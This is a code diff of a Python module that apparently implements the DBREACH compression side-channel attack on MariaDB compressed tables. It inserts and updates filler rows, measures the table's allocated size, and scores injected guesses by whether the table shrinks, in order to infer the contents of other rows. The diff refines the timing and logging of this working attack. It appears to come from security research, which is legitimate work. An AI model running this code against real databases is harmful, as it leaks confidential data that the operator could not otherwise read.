@@ -1,180 +1,206 @@
+# /app/dbreacher_impl.py
+import os
 import utils.mariadb_utils as utils
 import dbreacher
-import time
 import random
-import string
+
+LOG_FULL = os.getenv("DBREACH_LOG_FULL", "1") != "0"
+
+def _say(msg: str):
+    # 풀 로그 기본 ON
+    print(msg)
 
 class DBREACHerImpl(dbreacher.DBREACHer):
-    def __init__(self, controller: utils.MariaDBController, tablename: str, startIdx: int, maxRowSize: int, fillerCharSet: set, compressCharAscii: int):
+    def __init__(self, controller: utils.MariaDBController, tablename: str, startIdx: int, maxRowSize: int, fillerCharSet, compressCharAscii: int):
+        if isinstance(fillerCharSet, set):
+            fillerCharSet = list(fillerCharSet)
         super().__init__(controller, tablename, startIdx, maxRowSize, fillerCharSet, compressCharAscii)
         self.compressibilityScoreReady = False
         self.bytesShrunkForCurrentGuess = 0
-        self.rowsAdded = 0 
+        self.rowsAdded = 0
         self.rowsChanged = [False, False, False, False]
         self.fillersInserted = False
-        self.compressChar = chr(compressCharAscii)
-        
-        print(f"Compress character initialized to: {self.compressChar}")
+
+        _say(f"[INIT] compressChar='{self.compressChar}', fillers={len(self.fillers)} rows, startIdx={self.startIdx}, maxRowSize={self.maxRowSize}")
+
+    def _comp(self, n: int) -> str:
+        return self.compressChar * n
 
     def reinsertFillers(self) -> bool:
         self.compressibilityScoreReady = False
         if self.fillersInserted:
-            print("Reinserting fillers...")
-            for row in range(self.startIdx, self.rowsAdded + self.startIdx - (self.bytesShrunkForCurrentGuess // 100)):
-                compressed_str = utils.get_compressible_str(200, char=self.compressChar)
-                print(f"Updating row {row} with compressible string.")
-                self.control.update_row(self.table, row, compressed_str)
-            for row in range(self.startIdx, self.rowsAdded + self.startIdx):
-                print(f"Deleting row {row}.")
-                self.control.delete_row(self.table, row)
-            
-            self.bytesShrunkForCurrentGuess = 0
-            self.fillers = [''.join(random.choices(self.fillerCharSet, k=self.maxRowSize)) for _ in range(self.numFillerRows)]
-            print(f"Fillers list created with {len(self.fillers)} fillers.")
-        else:
-            print("Fillers not inserted yet. Skipping reinsertion.")
+            _say("[REINSERT] begin")
+            # 최근에 부풀린 영역 되돌리기
+            upto = self.rowsAdded + self.startIdx - (self.bytesShrunkForCurrentGuess // 100)
+            for row in range(self.startIdx, upto):
+                s = self._comp(200)
+                _say(f"[REINSERT] UPDATE row={row} -> '{s}'")
+                self.control.update_row(self.table, row, s)
+            self.control.flush_and_wait(self.table)
 
+            for row in range(self.startIdx, self.rowsAdded + self.startIdx):
+                _say(f"[REINSERT] DELETE row={row}")
+                self.control.delete_row(self.table, row)
+            self.control.flush_and_wait(self.table)
+
+            self.bytesShrunkForCurrentGuess = 0
+            self.fillers = [
+                ''.join(self.rng.choices(self.fillerCharSet, k=self.maxRowSize))
+                for _ in range(self.numFillerRows)
+            ]
+            _say(f"[REINSERT] regenerated fillers={len(self.fillers)}")
+        else:
+            _say("[REINSERT] first-time setup (no previous fillers)")
         return self.insertFillers()
 
     def insertFillers(self) -> bool:
         self.fillersInserted = True
-        oldSize = self.control.get_table_size(self.table)
-        print(f"Old table size: {oldSize} bytes")
-        
-        # filler 리스트가 비어있는지 확인
+        oldSize = self.control.get_table_size_alloc(self.table)
+        _say(f"[FILLER] old_alloc={oldSize}")
+
         if not self.fillers:
-            print("Error: Fillers list is empty.")
+            _say("[FILLER] ERROR: fillers empty")
             return False
-        
-        # insert first filler row for putting in guesses:
-        print(f"Inserting filler at row {self.startIdx}: {self.fillers[0]}")
-        self.control.insert_row(self.table, self.startIdx, self.fillers[0]) 
+
+        # 첫 filler(guess가 들어갈 자리)는 랜덤 200B로 유지
+        _say(f"[FILLER] INSERT row={self.startIdx} val='{self.fillers[0]}'")
+        self.control.insert_row(self.table, self.startIdx, self.fillers[0])
+        self.control.flush_and_wait(self.table)
         self.rowsAdded = 1
-        newSize = self.control.get_table_size(self.table)
-        print(f"New table size after first insert: {newSize} bytes")
+        newSize = self.control.get_table_size_alloc(self.table)
+        _say(f"[FILLER] after first insert alloc={newSize}")
 
         if newSize > oldSize:
-            # table grew too quickly, before we could insert all necessary fillers
-            print("Table grew too quickly. Aborting filler insertion.")
+            _say("[FILLER] grew too quickly -> abort")
             return False
-        
-        compression_bootstrapper = utils.get_compressible_str(100, char=self.compressChar)
-        print(f"Compression bootstrapper: {compression_bootstrapper}")
-        
-        # insert shrinker rows:
-        # insert filler rows until table grows:
+
+        # ★ 논문식 경계 탐색: 각 filler를 100개의 '*' + (랜덤 100B)로 구성
+        compression_bootstrapper = self._comp(100)
         i = 1
-        while newSize <= oldSize: 
+        while newSize <= oldSize:
             if i >= len(self.fillers):
-                print(f"Error: Not enough fillers to insert. Needed: {i+1}, Available: {len(self.fillers)}")
+                _say(f"[FILLER] ERROR: not enough fillers (need {i+1}, have {len(self.fillers)})")
                 return False
             filler = self.fillers[i]
-            filler_part = filler[100:]
-            combined_str = compression_bootstrapper + filler_part
-            print(f"Inserting filler at row {self.startIdx + i}: {combined_str}")
-            self.control.insert_row(self.table, self.startIdx + i, combined_str)
-            newSize = self.control.get_table_size(self.table)
-            print(f"New table size after inserting row {self.startIdx + i}: {newSize} bytes")
+            combined = compression_bootstrapper + filler[100:]  # 100* + 100 random
+            rowid = self.startIdx + i
+            _say(f"[FILLER] INSERT row={rowid} val='{combined}'")
+            self.control.insert_row(self.table, rowid, combined)
+            self.control.flush_and_wait(self.table)
+            newSize = self.control.get_table_size_alloc(self.table)
+            _say(f"[FILLER] alloc now={newSize}")
             i += 1
             self.rowsAdded += 1
+
         self.rowsChanged = [False, False, False, False]
-        print(f"Inserted {self.rowsAdded} filler rows successfully.")
+        _say(f"[FILLER] boundary reached, rowsAdded={self.rowsAdded}")
         return True
 
     def insertGuessAndCheckIfShrunk(self, guess: str) -> bool:
         self.compressibilityScoreReady = False
         self.bytesShrunkForCurrentGuess = 0
 
-        # reset first 3 rows to original state before inserting guess:
         if self.rowsChanged[0]:
-            print(f"Resetting row {self.startIdx} to original filler.")
+            _say(f"[GUESS] reset row={self.startIdx} -> '{self.fillers[0]}'")
             self.control.update_row(self.table, self.startIdx, self.fillers[0])
             self.rowsChanged[0] = False
-        compression_bootstrapper = utils.get_compressible_str(100, char=self.compressChar)
+
+        compression_bootstrapper = self._comp(100)
         for i in range(1, 4):
             if self.rowsChanged[i]:
-                print(f"Resetting row {self.startIdx + self.rowsAdded - i} to original filler.")
-                self.rowsChanged[i] = False
                 row_to_reset = self.startIdx + self.rowsAdded - i
                 filler = self.fillers[self.rowsAdded - i]
                 reset_str = compression_bootstrapper + filler[100:]
+                _say(f"[GUESS] reset row={row_to_reset} -> '{reset_str}'")
                 self.control.update_row(self.table, row_to_reset, reset_str)
-        
-        old_size = self.control.get_table_size(self.table)
-        print(f"Old table size before guess insertion: {old_size} bytes")
+                self.rowsChanged[i] = False
+
+        self.control.flush_and_wait(self.table)
+        old_size = self.control.get_table_size_alloc(self.table)
+
         new_first_row = guess + self.fillers[0][len(guess):]
         if new_first_row != self.fillers[0]:
-            print(f"Updating row {self.startIdx} with guess: {new_first_row}")
+            _say(
+                f"[GUESS] UPDATE row={self.startIdx}\n"
+                f"  guess='{guess}'\n"
+                f"  before='{self.fillers[0]}'\n"
+                f"  after ='{new_first_row}'"
+            )
             self.control.update_row(self.table, self.startIdx, new_first_row)
             self.rowsChanged[0] = True
-        new_size = self.control.get_table_size(self.table)
-        print(f"New table size after guess insertion: {new_size} bytes")
+
+        self.control.flush_and_wait(self.table)
+        new_size = self.control.get_table_size_alloc(self.table)
+        _say(f"[GUESS] alloc {old_size} -> {new_size}")
         return new_size < old_size
 
     def getSNoReferenceScore(self, length: int, charSet) -> float:
-        refGuess = ''.join(random.choices(charSet, k=length)) 
-        print(f"Inserting reference guess (No) of length {length}: {refGuess}")
+        seq = charSet if isinstance(charSet, (list, str, tuple)) else list(charSet)
+        refGuess = ''.join(self.rng.choices(seq, k=length))
+        _say(f"[REF:NO] L={length} refGuess='{refGuess}'")
         shrunk = self.insertGuessAndCheckIfShrunk(refGuess)
         if shrunk:
-            raise RuntimeError("Table shrunk too early on insertion of guess")
+            raise RuntimeError("Table shrunk too early on insertion of NO-ref guess")
         while not shrunk:
             shrunk = self.addCompressibleByteAndCheckIfShrunk()
         return self.getBytesShrunkForCurrentGuess()
 
     def getSYesReferenceScore(self, length: int) -> float:
         refGuess = self.fillers[1][100:][:length]
-        print(f"Inserting reference guess (Yes) of length {length}: {refGuess}")
+        _say(f"[REF:YES] L={length} refGuess='{refGuess}' (from fillers[1][100:])")
         shrunk = self.insertGuessAndCheckIfShrunk(refGuess)
         if shrunk:
-            raise RuntimeError("Table shrunk too early on insertion of guess")
+            raise RuntimeError("Table shrunk too early on insertion of YES-ref guess")
         while not shrunk:
             shrunk = self.addCompressibleByteAndCheckIfShrunk()
         return self.getBytesShrunkForCurrentGuess()
 
     def addCompressibleByteAndCheckIfShrunk(self) -> bool:
-        old_size = self.control.get_table_size(self.table)
+        old_size = self.control.get_table_size_alloc(self.table)
         self.bytesShrunkForCurrentGuess += 1
-        if self.bytesShrunkForCurrentGuess <= 100: 
+        b = self.bytesShrunkForCurrentGuess
+
+        if b <= 100:
+            comp = self._comp(100 + b)
+            row = self.startIdx + self.rowsAdded - 1
+            newval = comp + self.fillers[self.rowsAdded - 1][len(comp):]
+            _say(f"[AMP] +1B (phase1) row={row} val='{newval}'")
+            self.control.update_row(self.table, row, newval)
             self.rowsChanged[1] = True
-            compress_str = utils.get_compressible_str(100 + self.bytesShrunkForCurrentGuess, char=self.compressChar)
-            row_to_update = self.startIdx + self.rowsAdded - 1
-            print(f"Updating row {row_to_update} with: {compress_str}")
-            self.control.update_row(self.table, row_to_update, compress_str + self.fillers[self.rowsAdded - 1][len(compress_str):]) 
-        elif self.bytesShrunkForCurrentGuess <= 200: 
+        elif b <= 200:
+            comp = self._comp(b)
+            row = self.startIdx + self.rowsAdded - 2
+            newval = comp + self.fillers[self.rowsAdded - 2][len(comp):]
+            _say(f"[AMP] +1B (phase2) row={row} val='{newval}'")
+            self.control.update_row(self.table, row, newval)
             self.rowsChanged[2] = True
-            compress_str = utils.get_compressible_str(self.bytesShrunkForCurrentGuess, char=self.compressChar) 
-            row_to_update = self.startIdx + self.rowsAdded - 2
-            print(f"Updating row {row_to_update} with: {compress_str}")
-            self.control.update_row(self.table, row_to_update, compress_str + self.fillers[self.rowsAdded - 2][len(compress_str):])
-        elif self.bytesShrunkForCurrentGuess <= 300:
+        elif b <= 300:
+            comp = self._comp(b - 100)
+            row = self.startIdx + self.rowsAdded - 3
+            newval = comp + self.fillers[self.rowsAdded - 3][len(comp):]
+            _say(f"[AMP] +1B (phase3) row={row} val='{newval}'")
+            self.control.update_row(self.table, row, newval)
             self.rowsChanged[3] = True
-            compress_str = utils.get_compressible_str(self.bytesShrunkForCurrentGuess - 100, char=self.compressChar)
-            row_to_update = self.startIdx + self.rowsAdded - 3
-            print(f"Updating row {row_to_update} with: {compress_str}")
-            self.control.update_row(self.table, row_to_update, compress_str + self.fillers[self.rowsAdded - 3][len(compress_str):])
         else:
-            print("Maximum compressible bytes reached.")
-            raise RuntimeError()
-            self.compressibilityScoreReady = True
-            return True
-        new_size = self.control.get_table_size(self.table)
-        print(f"New table size after compression byte addition: {new_size} bytes")
+            _say("[AMP] cap reached (b>300)")
+            raise RuntimeError("Amplification cap reached")
+
+        self.control.flush_and_wait(self.table)
+        new_size = self.control.get_table_size_alloc(self.table)
+        _say(f"[AMP] alloc {old_size} -> {new_size}")
 
         if new_size < old_size:
             self.compressibilityScoreReady = True
-            print(f"Compression succeeded. Bytes shrunk: {self.bytesShrunkForCurrentGuess}")
+            _say(f"[AMP] SHRUNK! bytesShrunkForCurrentGuess={self.bytesShrunkForCurrentGuess}")
             return True
-        else:
-            return False
+        return False
 
     def getCompressibilityScoreOfCurrentGuess(self) -> float:
         if self.compressibilityScoreReady:
-            return float(1) / float(self.bytesShrunkForCurrentGuess)
-        else:
-            return None
+            return 1.0 / float(self.bytesShrunkForCurrentGuess)
+        return None
 
     def getBytesShrunkForCurrentGuess(self) -> int:
         if self.compressibilityScoreReady:
             return self.bytesShrunkForCurrentGuess
-        else:
-            return None
+        return None
